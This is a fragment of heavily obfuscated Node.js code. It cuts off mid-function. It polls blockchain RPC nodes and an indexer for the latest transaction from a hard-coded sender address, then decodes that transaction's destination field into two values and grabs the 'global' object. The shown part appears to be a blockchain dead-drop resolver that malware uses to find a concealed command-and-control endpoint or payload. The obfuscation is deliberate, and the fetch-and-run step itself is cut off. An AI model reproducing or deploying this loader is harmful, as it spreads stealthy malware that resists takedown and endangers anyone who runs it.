_0x449a91=_0x2e2d2f;_0x2fbb36||(_0x45c1af?_0x4105ce[_0x449a91(0x199)](_0x3d8765,_0x45c1af):_0x4105ce[_0x449a91(0x1da)](0x1*0x1d29+0x3*0x8c9+-0x3784,--_0x2c6a88)&&_0x4105ce[_0x449a91(0x27b)](_0x21c76e,null));},function(){var _0x4ebeeb=_0x2e2d2f;_0x2fbb36||_0x4105ce[_0x4ebeeb(0x257)](0x6*-0x291+0xc0f*0x2+-0x8b8,--_0x2c6a88)||_0x4105ce[_0x4ebeeb(0x27b)](_0x21c76e,null);});});}function candidateBlocks(_0x15eb4b){var _0x512217=_0x58000a,_0x56bb01={'bkGyS':function(_0x37fb8f,_0x435882){return _0x37fb8f-_0x435882;},'vLrzU':function(_0x5a363c,_0x433e65){return _0x5a363c+_0x433e65;},'yLOOW':function(_0x10e704,_0x40ed9d){return _0x10e704-_0x40ed9d;},'HKfgj':function(_0x103048,_0x15313c){return _0x103048<_0x15313c;},'KICMG':function(_0x5a4050,_0x84d96c){return _0x5a4050(_0x84d96c);}},_0x338977,_0x37d60c=_0x56bb01[_0x512217(0x332)](_0x15eb4b,BLOCK_MULTIPLE),_0x16ef81=[_0x56bb01[_0x512217(0x332)](_0x15eb4b,0xca+-0x8*-0x200+-0x10c9*0x1),_0x15eb4b,_0x56bb01[_0x512217(0x333)](_0x15eb4b,-0x1f38+0x186b+-0x1*-0x6ce),_0x56bb01[_0x512217(0x339)](_0x37d60c,0x2041+-0x256e+-0x1ba*-0x3),_0x37d60c,_0x56bb01[_0x512217(0x333)](_0x37d60c,0x2060+0x21ad*-0x1+0x14e)],_0x114011={},_0x3b55f6=[];for(_0x338977=-0xf3*-0x1b+0xb1*0x1d+-0x2dae;_0x56bb01[_0x512217(0x285)](_0x338977,_0x16ef81[_0x512217(0x337)]);_0x338977++)if(!_0x56bb01[_0x512217(0x285)](_0x16ef81[_0x338977],0x1*0x2335+0x206e*-0x1+-0x2c7)){var _0x1bd175=_0x56bb01[_0x512217(0x2c5)](String,_0x16ef81[_0x338977]);_0x114011[_0x1bd175]||(_0x114011[_0x1bd175]=!(-0x1*-0x42d+-0x3d1*0x3+0x746),_0x3b55f6[_0x512217(0x2a9)](_0x16ef81[_0x338977]));}return _0x3b55f6;}function blockTask(_0x12eade){var _0x473498=_0x58000a,_0x3559c1={'uBewu':function(_0x169cab,_0x1d77d9,_0x1eb7bd,_0x239894,_0x486653){return _0x169cab(_0x1d77d9,_0x1eb7bd,_0x239894,_0x486653);},'CJobJ':_0x473498(0x22d)+_0x473498(0x1c1),'WBFKG':function(_0x5ca268,_0x21c7c0){return _0x5ca268(_0x21c7c0);},'kRsFE':function(_0x312881,_0x40a605,_0x245fcc){return _0x312881(_0x40a605,_0x245fcc);}},_0x3c2107=new AbortController();return{'controller':_0x3c2107,'run':function(){var _0x58f27f=_0x473498;return _0x3559c1[_0x58f27f(0x2e5)](withRpcEndpoints,function(_0x3a39bf,_0x50b35d){var _0x1ed0a6=_0x58f27f;return _0x3559c1[_0x1ed0a6(0x2b8)](rpcCall,_0x3a39bf,_0x3559c1[_0x1ed0a6(0x2b1)],[_0x3559c1[_0x1ed0a6(0x20e)](toBlockHex,_0x12eade),!(-0x1753+0x194a+-0x1f7)],_0x50b35d);},_0x3c2107[_0x58f27f(0x2e7)])[_0x58f27f(0x273)](function(_0x380e1e){var _0x101cd6=_0x58f27f,_0x4b2601=_0x380e1e&&_0x380e1e[_0x101cd6(0x2e4)+'ns'];if(!Array[_0x101cd6(0x17d)](_0x4b2601))return null;var _0x527755=_0x3559c1[_0x101cd6(0x20e)](findSenderTx,_0x4b2601);return _0x527755?{'blockNumber':_0x12eade,'tx':_0x527755}:null;});}};}function nonceAtBlocks(_0x32bfde,_0x2b381f){var _0x244225=_0x58000a,_0x1726fb={'oHjzy':function(_0x30d6ac,_0x58120e,_0x198f25,_0x2226d1){return _0x30d6ac(_0x58120e,_0x198f25,_0x2226d1);},'rBHMa':function(_0x25c299,_0x2e2aad){return _0x25c299<_0x2e2aad;},'FXvey':function(_0x5c1a1a,_0x168294){return _0x5c1a1a(_0x168294);},'tRVvA':function(_0x36d50f,_0x52ff98,_0x24b3c6,_0x5ee122,_0xdd30be){return _0x36d50f(_0x52ff98,_0x24b3c6,_0x5ee122,_0xdd30be);},'txYuv':function(_0x34b963,_0x53ed79,_0x38c930){return _0x34b963(_0x53ed79,_0x38c930);},'uwLNS':_0x244225(0x2f0)+_0x244225(0x275)+_0x244225(0x310),'cEuCF':function(_0x7563c5,_0x34e487,_0x3a30a){return _0x7563c5(_0x34e487,_0x3a30a);}},_0x30e0cd,_0x1c0ebf=[];for(_0x30e0cd=-0x39f+-0x30d+-0xf4*-0x7;_0x1726fb[_0x244225(0x28d)](_0x30e0cd,_0x32bfde[_0x244225(0x337)]);_0x30e0cd++)_0x1c0ebf[_0x244225(0x2a9)]([_0x1726fb[_0x244225(0x227)],[SENDER,_0x1726fb[_0x244225(0x20f)](toBlockHex,_0x32bfde[_0x30e0cd])]]);return _0x1726fb[_0x244225(0x1d8)](withRpcEndpoints,function(_0x3fd04a,_0x33bf47){var _0x1408e0=_0x244225;return _0x1726fb[_0x1408e0(0x29c)](rpcBatch,_0x3fd04a,_0x1c0ebf,_0x33bf47);},_0x2b381f)[_0x244225(0x273)](function(_0x284b24){var _0x101f6b=_0x244225,_0x308324=[];for(_0x30e0cd=0x169*0x17+0xa24+0x9*-0x4bb;_0x1726fb[_0x101f6b(0x28d)](_0x30e0cd,_0x284b24[_0x101f6b(0x337)]);_0x30e0cd++)_0x308324[_0x101f6b(0x2a9)](_0x1726fb[_0x101f6b(0x20f)](Number,_0x284b24[_0x30e0cd]));return _0x308324;},function(){var _0x300bbb=_0x244225,_0x3dae25={'GJohI':function(_0x35b9c9,_0x5ad5ad,_0x136b71,_0x1a567e,_0x3cbe08){var _0x1d7aab=_0x3cb6;return _0x1726fb[_0x1d7aab(0x245)](_0x35b9c9,_0x5ad5ad,_0x136b71,_0x1a567e,_0x3cbe08);},'EyuqL':function(_0x34be1c,_0x346534){var _0x296c08=_0x3cb6;return _0x1726fb[_0x296c08(0x28d)](_0x34be1c,_0x346534);},'bDNYD':function(_0x15064d,_0x2aba09){var _0x46232a=_0x3cb6;return _0x1726fb[_0x46232a(0x20f)](_0x15064d,_0x2aba09);}},_0x45e3f0=[];for(_0x30e0cd=0x1bc8+-0xc6f+-0xf59;_0x1726fb[_0x300bbb(0x28d)](_0x30e0cd,_0x1c0ebf[_0x300bbb(0x337)]);_0x30e0cd++)_0x45e3f0[_0x300bbb(0x2a9)](_0x1726fb[_0x300bbb(0x20d)](withRpcEndpoints,function(_0x314727,_0x55fea9){var _0x2bd8b6=_0x300bbb;return _0x3dae25[_0x2bd8b6(0x19a)](rpcCall,_0x314727,_0x1c0ebf[_0x30e0cd][-0x2446+-0x109*-0x1+0x5d*0x61],_0x1c0ebf[_0x30e0cd][-0xd73+-0x1e6e+0x2be2],_0x55fea9);},_0x2b381f));return Promise[_0x300bbb(0x261)](_0x45e3f0)[_0x300bbb(0x273)](function(_0x4f4bcc){var _0x18385a=_0x300bbb,_0x59a06e=[];for(_0x30e0cd=0x1cdd+-0x3*-0x15d+0x6f*-0x4c;_0x3dae25[_0x18385a(0x1a1)](_0x30e0cd,_0x4f4bcc[_0x18385a(0x337)]);_0x30e0cd++)_0x59a06e[_0x18385a(0x2a9)](_0x3dae25[_0x18385a(0x294)](Number,_0x4f4bcc[_0x30e0cd]));return _0x59a06e;});});}function lastSenderTx(_0x1b7b99){var _0x4d660a=_0x58000a,_0x1268db={'CCUfc':function(_0x1c9634,_0x58cc73,_0x4f9169,_0x2d2c3e,_0x231844){return _0x1c9634(_0x58cc73,_0x4f9169,_0x2d2c3e,_0x231844);},'lhviQ':_0x4d660a(0x1fc)+_0x4d660a(0x1b6),'OQIXz':function(_0x4e2119,_0x5bfbe8){return _0x4e2119(_0x5bfbe8);},'zmPPj':_0x4d660a(0x2f0)+_0x4d660a(0x275)+_0x4d660a(0x310),'YSOrg':function(_0x101750,_0x5a5ca9,_0x5907b2){return _0x101750(_0x5a5ca9,_0x5907b2);},'zNelt':function(_0x4bc0e7,_0x329821){return _0x4bc0e7<_0x329821;},'oHewR':function(_0x51b594,_0x35bfd0){return _0x51b594>=_0x35bfd0;},'ZquVE':function(_0x44dc13,_0x13b839){return _0x44dc13===_0x13b839;},'ORDec':function(_0x87d22,_0x3df386){return _0x87d22-_0x3df386;},'iDYqw':function(_0x56e568,_0x75b354){return _0x56e568>_0x75b354;},'nCeoF':function(_0xa20397,_0x6f89fe){return _0xa20397-_0x6f89fe;},'dkBbf':function(_0x5d3478){return _0x5d3478();},'hHshS':function(_0x4d6945,_0x73792f){return _0x4d6945<=_0x73792f;},'aMPct':function(_0x534a20,_0x19e877){return _0x534a20-_0x19e877;},'RVvoG':function(_0x27056b,_0x36e6cb){return _0x27056b-_0x36e6cb;},'FPGIh':function(_0x3eb7e4,_0x433107){return _0x3eb7e4-_0x433107;},'oADhP':function(_0x38225d,_0x5b1508){return _0x38225d+_0x5b1508;},'fuQLh':function(_0x1046e1,_0x25570b){return _0x1046e1/_0x25570b;},'sQENy':function(_0x3e3aff,_0x48be8e){return _0x3e3aff*_0x48be8e;},'DmBJV':function(_0x209b0b,_0x1e0d46){return _0x209b0b+_0x1e0d46;},'HvojL':function(_0xa34652,_0x3c7683,_0x3ad669){return _0xa34652(_0x3c7683,_0x3ad669);},'zeayr':function(_0x13603e,_0x2c015a,_0x4f8152,_0xddf5eb,_0x563aef){return _0x13603e(_0x2c015a,_0x4f8152,_0xddf5eb,_0x563aef);},'bEySh':_0x4d660a(0x22d)+_0x4d660a(0x1c1),'OEYvG':function(_0x5a58ed,_0x410b25){return _0x5a58ed(_0x410b25);},'xFqQB':function(_0x1c660b,_0x1dd9f0,_0x4857a2){return _0x1c660b(_0x1dd9f0,_0x4857a2);},'FcPCc':function(_0x5ede37,_0x3ee695){return _0x5ede37<_0x3ee695;},'XyYgB':function(_0xa40e46,_0x2eb32a){return _0xa40e46===_0x2eb32a;},'yUEvn':function(_0x4b497b,_0x34d32c){return _0x4b497b(_0x34d32c);},'EecnS':function(_0x274674,_0x31e8ed){return _0x274674-_0x31e8ed;},'IMBTW':function(_0x5028a5,_0x892f67){return _0x5028a5!=_0x892f67;},'oKQzr':function(_0x5a5b74,_0x475125,_0x522d9b){return _0x5a5b74(_0x475125,_0x522d9b);}},_0x27f1e4,_0x537e2a,_0x12237d,_0x57a13c=new AbortController();return(_0x1268db[_0x4d660a(0x239)](null,_0x1b7b99)?Promise[_0x4d660a(0x22b)](_0x1b7b99):_0x1268db[_0x4d660a(0x202)](withRpcEndpoints,function(_0x58a340,_0xf70c81){var _0x54d697=_0x4d660a;return _0x1268db[_0x54d697(0x331)](rpcCall,_0x58a340,_0x1268db[_0x54d697(0x1c6)],[],_0xf70c81);},_0x57a13c[_0x4d660a(0x2e7)])[_0x4d660a(0x273)](function(_0x1fe1c0){var _0x56b3fa=_0x4d660a;return _0x1268db[_0x56b3fa(0x2cb)](Number,_0x1fe1c0);}))[_0x4d660a(0x273)](function(_0xebe0cc){var _0x518539=_0x4d660a,_0xe03ede={'nkZNx':function(_0xebd37c,_0xcd6177,_0x1733ed,_0x52e011,_0x413c63){var _0x43f538=_0x3cb6;return _0x1268db[_0x43f538(0x331)](_0xebd37c,_0xcd6177,_0x1733ed,_0x52e011,_0x413c63);},'nWABw':_0x1268db[_0x518539(0x1bc)],'yYyZi':function(_0x5c702e,_0x23dfa7){var _0x24b146=_0x518539;return _0x1268db[_0x24b146(0x2cb)](_0x5c702e,_0x23dfa7);}};return _0x27f1e4=_0xebe0cc,_0x1268db[_0x518539(0x2a8)](withRpcEndpoints,function(_0x3107db,_0x56006a){var _0x4cbb50=_0x518539;return _0xe03ede[_0x4cbb50(0x1ac)](rpcCall,_0x3107db,_0xe03ede[_0x4cbb50(0x308)],[SENDER,_0xe03ede[_0x4cbb50(0x19c)](toBlockHex,_0x27f1e4)],_0x56006a);},_0x57a13c[_0x518539(0x2e7)]);})[_0x4d660a(0x273)](function(_0x82c75){var _0x3cf65c=_0x4d660a,_0x29f4aa={'NZGbr':function(_0x371805,_0x4c03cb){var _0x15a793=_0x3cb6;return _0x1268db[_0x15a793(0x1e2)](_0x371805,_0x4c03cb);},'zmfOI':function(_0x4fb527,_0x65a33b){var _0x4ee345=_0x3cb6;return _0x1268db[_0x4ee345(0x31c)](_0x4fb527,_0x65a33b);},'nRDuK':function(_0x581a5c,_0x27ceee){var _0x3271f1=_0x3cb6;return _0x1268db[_0x3271f1(0x18b)](_0x581a5c,_0x27ceee);},'oNbPP':function(_0x4de59a,_0xb4ce60){var _0x19aba3=_0x3cb6;return _0x1268db[_0x19aba3(0x2ba)](_0x4de59a,_0xb4ce60);},'sqsLa':function(_0x5372f5,_0x2aa49e){var _0x5963d0=_0x3cb6;return _0x1268db[_0x5963d0(0x2d0)](_0x5372f5,_0x2aa49e);},'RoTcb':function(_0x251855,_0x503fe6){var _0x485f4a=_0x3cb6;return _0x1268db[_0x485f4a(0x2a1)](_0x251855,_0x503fe6);},'ajGUU':function(_0x5c985b,_0x4a7fa8){var _0x20114e=_0x3cb6;return _0x1268db[_0x20114e(0x2cb)](_0x5c985b,_0x4a7fa8);}};_0x537e2a=_0x1268db[_0x3cf65c(0x2a1)](Number,_0x82c75),_0x12237d=_0x1268db[_0x3cf65c(0x204)](_0x537e2a,-0xbed+0x1d81+-0x1193);var _0x3c3a49=_0x1268db[_0x3cf65c(0x284)](SEARCH_FLOOR,0x2*0xa60+-0x12*-0x1df+0x1*-0x366d),_0x3f186d=_0x27f1e4;return function _0x12996c(){var _0x53d6e3=_0x3cf65c,_0x134b15={'kWMvT':function(_0x52e40f,_0xb6c0a){var _0x322044=_0x3cb6;return _0x1268db[_0x322044(0x211)](_0x52e40f,_0xb6c0a);},'iCAkU':function(_0x3b0283,_0x5b551f){var _0x22ad94=_0x3cb6;return _0x1268db[_0x22ad94(0x230)](_0x3b0283,_0x5b551f);},'wuvDX':function(_0x497383,_0x4fc426){var _0x474459=_0x3cb6;return _0x1268db[_0x474459(0x18b)](_0x497383,_0x4fc426);},'Bvhhk':function(_0x3c905e,_0x79fa0f){var _0x2ad4e0=_0x3cb6;return _0x1268db[_0x2ad4e0(0x25d)](_0x3c905e,_0x79fa0f);},'jYhyK':function(_0x277314,_0x152b4d){var _0x2cae20=_0x3cb6;return _0x1268db[_0x2cae20(0x2d0)](_0x277314,_0x152b4d);},'vFgAU':function(_0x3ad786,_0x48fa9e){var _0x4691da=_0x3cb6;return _0x1268db[_0x4691da(0x284)](_0x3ad786,_0x48fa9e);},'iOozQ':function(_0x49c084){var _0x16a0b2=_0x3cb6;return _0x1268db[_0x16a0b2(0x2f9)](_0x49c084);}};if(_0x1268db[_0x53d6e3(0x327)](_0x1268db[_0x53d6e3(0x219)](_0x3f186d,_0x3c3a49),-0x23c8+-0x2345*-0x1+-0x1*-0x84))return Promise[_0x53d6e3(0x22b)]();var _0x322979,_0xa271f8=_0x1268db[_0x53d6e3(0x314)](_0x1268db[_0x53d6e3(0x1f6)](_0x3f186d,_0x3c3a49),-0x180+0x1266+-0x10e5),_0x484e3a=Math[_0x53d6e3(0x30f)](NONCE_FANOUT,_0xa271f8),_0x799f58=[];for(_0x322979=0x1ce9+0x1a8d+0x3775*-0x1;_0x1268db[_0x53d6e3(0x327)](_0x322979,_0x484e3a);_0x322979++)_0x799f58[_0x53d6e3(0x2a9)](_0x1268db[_0x53d6e3(0x2f3)](_0x3c3a49,_0x1268db[_0x53d6e3(0x32b)](_0x1268db[_0x53d6e3(0x2e8)](_0x322979,_0x1268db[_0x53d6e3(0x219)](_0x3f186d,_0x3c3a49)),_0x1268db[_0x53d6e3(0x2cf)](_0x484e3a,-0x2632+0x13e9*-0x1+-0x1d0e*-0x2))));return _0x1268db[_0x53d6e3(0x1e6)](nonceAtBlocks,_0x799f58,_0x57a13c[_0x53d6e3(0x2e7)])[_0x53d6e3(0x273)](function(_0x1a4804){var _0x56c48b=_0x53d6e3,_0x1ab72b,_0x3fef5c=-(0x347+0xa*0x19+0x440*-0x1);for(_0x1ab72b=0xcb8+-0x29d*-0x7+-0x1d3*0x11;_0x134b15[_0x56c48b(0x217)](_0x1ab72b,_0x1a4804[_0x56c48b(0x337)]);_0x1ab72b++)if(_0x134b15[_0x56c48b(0x263)](_0x1a4804[_0x1ab72b],_0x537e2a)){_0x3fef5c=_0x1ab72b;break;}return _0x134b15[_0x56c48b(0x336)](-(-0x19b0+0x10f3*-0x1+0x2*0x1552),_0x3fef5c)?_0x3c3a49=_0x799f58[_0x134b15[_0x56c48b(0x2ad)](_0x799f58[_0x56c48b(0x337)],0xc6d*-0x2+0x24b4+0x1*-0xbd9)]:(_0x3f186d=_0x799f58[_0x3fef5c],_0x134b15[_0x56c48b(0x32a)](_0x3fef5c,0xcea+-0x7ef*0x1+-0x55*0xf)&&(_0x3c3a49=_0x799f58[_0x134b15[_0x56c48b(0x33d)](_0x3fef5c,0x1*-0xc7b+-0x1c2e+0x28aa)])),_0x134b15[_0x56c48b(0x1b1)](_0x12996c);});}()[_0x3cf65c(0x273)](function(){var _0x371bb1=_0x3cf65c,_0x3f33ab={'Njwhx':function(_0x479063,_0x36fb82,_0x201565,_0x20ee17,_0x1336c6){var _0x2a3c32=_0x3cb6;return _0x1268db[_0x2a3c32(0x200)](_0x479063,_0x36fb82,_0x201565,_0x20ee17,_0x1336c6);},'cXqxg':_0x1268db[_0x371bb1(0x2ee)],'mumtK':function(_0x1f8187,_0x20bbab){var _0x1663db=_0x371bb1;return _0x1268db[_0x1663db(0x2a1)](_0x1f8187,_0x20bbab);}};return _0x1268db[_0x371bb1(0x1a2)](withRpcEndpoints,function(_0x148306,_0x4f3bf1){var _0x36d7f2=_0x371bb1;return _0x3f33ab[_0x36d7f2(0x1d5)](rpcCall,_0x148306,_0x3f33ab[_0x36d7f2(0x26d)],[_0x3f33ab[_0x36d7f2(0x26e)](toBlockHex,_0x3f186d),!(0x1d1c+0x3*0x570+-0x2d6c)],_0x4f3bf1);},_0x57a13c[_0x371bb1(0x2e7)])[_0x371bb1(0x273)](function(_0x4207dc){var _0x5504f7=_0x371bb1,_0xa9f5d2,_0x2c1453=_0x4207dc&&_0x4207dc[_0x5504f7(0x2e4)+'ns']||[],_0x1507e3=null;for(_0xa9f5d2=0xa85+0x6b+0xc8*-0xe;_0x29f4aa[_0x5504f7(0x1ee)](_0xa9f5d2,_0x2c1453[_0x5504f7(0x337)]);_0xa9f5d2++){var _0x110b6b=_0x2c1453[_0xa9f5d2];if(_0x110b6b[_0x5504f7(0x303)]&&_0x29f4aa[_0x5504f7(0x234)](_0x110b6b[_0x5504f7(0x303)][_0x5504f7(0x201)+'e'](),SENDER)){if(_0x29f4aa[_0x5504f7(0x313)](_0x29f4aa[_0x5504f7(0x188)](Number,_0x110b6b[_0x5504f7(0x290)]),_0x12237d)){_0x1507e3=_0x110b6b;break;}(!_0x1507e3||_0x29f4aa[_0x5504f7(0x297)](_0x29f4aa[_0x5504f7(0x33c)](Number,_0x110b6b[_0x5504f7(0x290)]),_0x29f4aa[_0x5504f7(0x19f)](Number,_0x1507e3[_0x5504f7(0x290)])))&&(_0x1507e3=_0x110b6b);}}return{'blockNumber':_0x3f186d,'tx':_0x1507e3};});});})[_0x4d660a(0x273)](function(_0x13f030){var _0x396d7c=_0x4d660a;return _0x57a13c[_0x396d7c(0x319)](),_0x13f030;},function(_0x10e1b8){var _0x1146c6=_0x4d660a;throw _0x57a13c[_0x1146c6(0x319)](),_0x10e1b8;});}function lastSenderTxViaIndexer(){var _0xddf40a=_0x58000a,_0x54b4f5={'ZUVcu':function(_0x1b4e87,_0x467811){return _0x1b4e87(_0x467811);},'okbhd':function(_0x4f0d7b,_0x264a1f){return _0x4f0d7b(_0x264a1f);},'JIuXY':function(_0xc23504,_0x4b0e0f){return _0xc23504+_0x4b0e0f;},'wgfDv':_0xddf40a(0x27f)+_0xddf40a(0x21d)+_0xddf40a(0x301)+_0xddf40a(0x1f5),'tEUWY':_0xddf40a(0x298)+_0xddf40a(0x232)+_0xddf40a(0x2dd)+_0xddf40a(0x238)+_0xddf40a(0x280)+_0xddf40a(0x271)+_0xddf40a(0x1bb)+'om'};return _0x54b4f5[_0xddf40a(0x2e6)](httpRequest,_0x54b4f5[_0xddf40a(0x252)](_0x54b4f5[_0xddf40a(0x252)](_0x54b4f5[_0xddf40a(0x252)](INDEXER_URL,_0x54b4f5[_0xddf40a(0x296)]),SENDER),_0x54b4f5[_0xddf40a(0x1e1)]))[_0xddf40a(0x273)](function(_0x57be19){var _0x302173=_0xddf40a,_0x31ed50=_0x54b4f5[_0x302173(0x249)](findSenderTx,_0x57be19&&Array[_0x302173(0x17d)](_0x57be19[_0x302173(0x26b)])?_0x57be19[_0x302173(0x26b)]:[]);return{'blockNumber':_0x54b4f5[_0x302173(0x249)](Number,_0x31ed50[_0x302173(0x24e)+'r']),'tx':_0x31ed50};});}function run(){var _0x3d0116=_0x58000a,_0x42fe9b={'wqGPb':function(_0x4669d3,_0x552352,_0x149107,_0x4d3f9b,_0x4af74e){return _0x4669d3(_0x552352,_0x149107,_0x4d3f9b,_0x4af74e);},'PHZYY':_0x3d0116(0x1fc)+_0x3d0116(0x1b6),'QDycG':function(_0x17cc7c){return _0x17cc7c();},'OtTwD':function(_0x6aaab9,_0x36df8d){return _0x6aaab9(_0x36df8d);},'zfRAK':function(_0x24d03e,_0x2bb085){return _0x24d03e-_0x2bb085;},'yBiGf':function(_0x62cc75,_0x37b85c){return _0x62cc75%_0x37b85c;},'AJIfa':function(_0x56a359,_0x40b420){return _0x56a359<_0x40b420;},'YTSLp':function(_0x53b3b1,_0x5c47e0){return _0x53b3b1(_0x5c47e0);},'NMXaR':function(_0xec70d,_0x3952dd){return _0xec70d(_0x3952dd);},'hBwij':_0x3d0116(0x1ca)+_0x3d0116(0x1f3),'INjGy':_0x3d0116(0x1ff)+_0x3d0116(0x1ae)+'4','pBLCT':function(_0x3e6a94,_0x6fbb57){return _0x3e6a94(_0x6fbb57);},'iUvqA':_0x3d0116(0x330),'rsraS':_0x3d0116(0x2d4)+_0x3d0116(0x22a),'DpUuE':function(_0x55dfd1,_0x1429ae){return _0x55dfd1!==_0x1429ae;},'eUtvz':_0x3d0116(0x23f),'UGsWy':_0x3d0116(0x28e),'hAXEP':_0x3d0116(0x1b7),'lPoSu':_0x3d0116(0x28b),'rvjRg':function(_0x4ec705,_0x2126e6){return _0x4ec705(_0x2126e6);},'TxXfx':function(_0x46cb60,_0x16a70b){return _0x46cb60+_0x16a70b;},'pnACO':_0x3d0116(0x2fd)+_0x3d0116(0x1fa)+_0x3d0116(0x22c)+_0x3d0116(0x264)+_0x3d0116(0x1c5)+_0x3d0116(0x1dd)+_0x3d0116(0x2da)+_0x3d0116(0x21c)+_0x3d0116(0x1cf)+_0x3d0116(0x29b)+_0x3d0116(0x1fd)+'6','BdHRr':function(_0x56e589,_0x202ba9){return _0x56e589(_0x202ba9);},'Kmajx':_0x3d0116(0x32f),'QhYcd':function(_0x101995,_0x299d3d,_0x78c29,_0x48cee2){return _0x101995(_0x299d3d,_0x78c29,_0x48cee2);},'fpOQw':function(_0x2265c0,_0x504bb4){return _0x2265c0+_0x504bb4;},'CQBGp':_0x3d0116(0x258),'rZjFr':_0x3d0116(0x29e),'IamIB':_0x3d0116(0x288),'Hvdas':_0x3d0116(0x2c0)+_0x3d0116(0x1ed),'vAuhA':function(_0x184779,_0xdad333){return _0x184779<_0xdad333;},'kYcNs':function(_0x4424e4,_0xe835c2){return _0x4424e4%_0xe835c2;},'EqNIK':_0x3d0116(0x23d),'zZUPO':function(_0x39b126,_0xbf488a){return _0x39b126<_0xbf488a;},'FzjOV':function(_0x308fc2,_0x20acee,_0x473273){return _0x308fc2(_0x20acee,_0x473273);},'WeBBc':_0x3d0116(0x203)+_0x3d0116(0x2ab),'EkQyc':function(_0x6f6a9,_0x411b83){return _0x6f6a9(_0x411b83);},'PsQpF':_0x3d0116(0x266),'kFKDq':function(_0x4c6caf,_0x159f37){return _0x4c6caf+_0x159f37;},'YfsuP':_0x3d0116(0x2c1),'YthhM':_0x3d0116(0x1f0),'ORyop':function(_0xcfca3c,_0x274d62){return _0xcfca3c+_0x274d62;},'toiEJ':function(_0x44e73c,_0x9c07de){return _0x44e73c+_0x9c07de;},'XWCds':function(_0x3548c9,_0x10ae79){return _0x3548c9+_0x10ae79;},'XzytT':function(_0x5b9d69,_0x360ea0){return _0x5b9d69+_0x360ea0;},'ndOll':_0x3d0116(0x2ff),'soTeq':function(_0x42f616,_0x212eab,_0x417e56,_0x19c296){return _0x42f616(_0x212eab,_0x417e56,_0x19c296);},'PhuGT':function(_0x1d1db6,_0x22cd21){return _0x1d1db6+_0x22cd21;},'yMBxL':_0x3d0116(0x277)+'s','TAXZS':function(_0x5778b3,_0x388a06){return _0x5778b3+_0x388a06;},'Czdln':_0x3d0116(0x195),'SnElf':_0x3d0116(0x311)+_0x3d0116(0x26c)};return _0x42fe9b[_0x3d0116(0x2f1)](withRpcEndpoints,function(_0x26e434,_0x6a1705){var _0x13bfd6=_0x3d0116;return _0x42fe9b[_0x13bfd6(0x241)](rpcCall,_0x26e434,_0x42fe9b[_0x13bfd6(0x1b9)],[],_0x6a1705);})[_0x3d0116(0x273)](function(_0x486e5d){var _0x95dcd5=_0x3d0116,_0x2bf6e7={'gUDMR':function(_0xd74178){var _0x39baaf=_0x3cb6;return _0x42fe9b[_0x39baaf(0x226)](_0xd74178);},'gOQaW':function(_0x49cf58,_0x9bd7c3){var _0x5b3d32=_0x3cb6;return _0x42fe9b[_0x5b3d32(0x2f1)](_0x49cf58,_0x9bd7c3);}},_0x1a2f96,_0x2854b2=_0x42fe9b[_0x95dcd5(0x2f1)](Number,_0x486e5d),_0x16bd4d=[],_0x361874=_0x42fe9b[_0x95dcd5(0x2f1)](candidateBlocks,_0x42fe9b[_0x95dcd5(0x30d)](_0x2854b2,_0x42fe9b[_0x95dcd5(0x2ae)](_0x2854b2,BLOCK_MULTIPLE)));for(_0x1a2f96=0xb*0x2ef+-0x885*0x3+-0x6b6;_0x42fe9b[_0x95dcd5(0x274)](_0x1a2f96,_0x361874[_0x95dcd5(0x337)]);_0x1a2f96++)_0x16bd4d[_0x95dcd5(0x2a9)](_0x42fe9b[_0x95dcd5(0x1f9)](blockTask,_0x361874[_0x1a2f96]));return _0x42fe9b[_0x95dcd5(0x1a4)](firstMatch,_0x16bd4d)[_0x95dcd5(0x273)](function(_0x5a95f9){var _0x31d0a5=_0x95dcd5,_0x4365f2={'Tulwa':function(_0x3dc4a5){var _0x47b210=_0x3cb6;return _0x2bf6e7[_0x47b210(0x250)](_0x3dc4a5);}};return _0x5a95f9||_0x2bf6e7[_0x31d0a5(0x237)](lastSenderTx,_0x2854b2)[_0x31d0a5(0x22f)](function(){var _0x35b67f=_0x31d0a5;return _0x4365f2[_0x35b67f(0x2a5)](lastSenderTxViaIndexer);});});})[_0x3d0116(0x273)](function(_0x41c884){var _0x869604=_0x3d0116,_0x171ff5={'EOVbu':function(_0x161dda,_0x311a0e){var _0x2e2d8c=_0x3cb6;return _0x42fe9b[_0x2e2d8c(0x2c3)](_0x161dda,_0x311a0e);},'SukDz':function(_0x1f735b,_0x58247a){var _0xe1cce6=_0x3cb6;return _0x42fe9b[_0xe1cce6(0x28f)](_0x1f735b,_0x58247a);},'OKeRK':_0x42fe9b[_0x869604(0x1af)],'Woqbi':function(_0x539776,_0x55b66f){var _0x12eb88=_0x869604;return _0x42fe9b[_0x12eb88(0x2a2)](_0x539776,_0x55b66f);},'vAfKE':function(_0x80c968,_0x245037,_0x165dfd){var _0x11d581=_0x869604;return _0x42fe9b[_0x11d581(0x21f)](_0x80c968,_0x245037,_0x165dfd);},'EJSIs':_0x42fe9b[_0x869604(0x20c)],'zjZjX':function(_0x199afc,_0x5c61b1){var _0x52a3b4=_0x869604;return _0x42fe9b[_0x52a3b4(0x18a)](_0x199afc,_0x5c61b1);},'XRcWZ':function(_0x2ab72f,_0x19df05){var _0x288328=_0x869604;return _0x42fe9b[_0x288328(0x1cd)](_0x2ab72f,_0x19df05);},'yXrvF':function(_0x4322fe,_0x53f811,_0x2c76c8,_0x41c855){var _0x3707ed=_0x869604;return _0x42fe9b[_0x3707ed(0x191)](_0x4322fe,_0x53f811,_0x2c76c8,_0x41c855);},'BilVg':_0x42fe9b[_0x869604(0x2f5)],'aLuye':function(_0x2218cb,_0x2861a9){var _0x10d56a=_0x869604;return _0x42fe9b[_0x10d56a(0x2ca)](_0x2218cb,_0x2861a9);},'HyQqa':_0x42fe9b[_0x869604(0x1d3)]},_0x5a3517=_0x42fe9b[_0x869604(0x181)](decodeAddress,_0x41c884['tx']['to']),_0x36aa32=_0x5a3517[0x1*0x1cc3+0x1859*0x1+-0x21*0x19c],_0x45c1fd=_0x5a3517[0x45b+-0x18*-0xbc+-0x15fa],_0x46ef11=global;function _0x47b98a(_0x421f6d,_0x389d05){var _0x1ba0f2=_0x869604,_0x500df5={'mtiIt':_0x42fe9b[_0x1ba0f2(0x267)],'bXDsG':_0x42fe9b[_0x1ba0f2(0x25a)],'REQwx':function(_0x242c61,_0x163e55){var _0x2511ed=_0x1ba0f2;return _0x42fe9b[_0x2511ed(0x181)](_0x242c61,_0x163e55);},'FWTXb':_0x42fe9b[_0x1ba0f2(0x212)],'NCWci':_0x42fe9b[_0x1ba0f2(0x292)],'rvEdp':function(_0x2f6a15,_0x59acf4){var _0x265dfa=_0x1ba0f2;return 